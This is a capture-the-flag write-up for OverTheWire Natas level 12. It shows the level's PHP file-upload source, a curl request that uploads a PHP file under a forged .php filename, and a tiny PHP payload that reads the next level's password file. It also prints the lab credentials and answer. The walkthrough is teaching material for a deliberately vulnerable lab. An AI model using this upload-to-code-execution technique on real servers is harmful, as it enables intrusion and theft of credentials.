Level #12 go to URL and find natas13 user password

- URL: http://natas12.natas.labs.overthewire.org/
- User: natas12
- Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

Useful reads for this chanllenge:
- [pathinfo()](https://www.php.net/manual/es/function.pathinfo.php)
- [$_FILES](https://oregoom.com/php/files/)
- [move_uploaded_files()](https://www.php.net/manual/en/function.move-uploaded-file.php)
- [file upload vulnerabilities](https://www.prplbx.com/resources/blog/exploiting-file-upload-vulnerabilities/)
- [postman file upload](https://blog.filestack.com/api/step-step-guide-postman-upload-file/)

After navigating to URL an html page with a form with 4 inputs (2 type=hidden,1 type=file and 1 type=submit) and an anchor element with the text "View sourcecode" is loaded.  
Clicking on the anchor elements redirects to the source code of the php script being run by server:
  
```PHP
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    //generate a p from 0..9
    for ($p = 0; $p < $length; $p++) {
	//append to $string the character at a random index between 0 and length-1 of the $characters string
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    //return the randomly generated string $string of 10 char length
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    //takes $dir and appends '/', a random generated string consisting of 10 chars, a '.' and an extension $ext
    $path = $dir."/".genRandomString().".".$ext;
    //checks if file in $path generated exists, if so keeps generating paths until it doesn't exists and returns
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    //gets the extension of the file path $fn
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

//check if 'filename' key exists in $_POST array
if(array_key_exists("filename", $_POST)) {
    //generates a path like upload/<ten_char_string>.pathinfo($_POST['filename'], PATHINFO_EXTENSION);
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

	//check if uploadedfile size is greater than 1000 bytes
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
	//if uploadedfile doesn't exceed 1000 bytes then move uploaded file to target path
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```
  
There is no enforcing on the type of file that gets uploaded to the server other than generating the filename as a .jpg.  
Recreated the request with postman:
```Bash
curl --location 'http://natas12.natas.labs.overthewire.org/index.php' \
--header 'Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==' \
--form 'MAX_FILE_SIZE="1000"' \
--form 'uploadedfile=@"/Users/kmnj500/Documents/overthewire/natas/phpfile.php"' \
--form 'filename="1gj2dcci21.php"'
```  
  
The contents of phpfile.php.
```PHP
<?php
echo file_get_contents('/etc/natas_webpass/natas13');
?>
```
  
The password for natas13 is lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
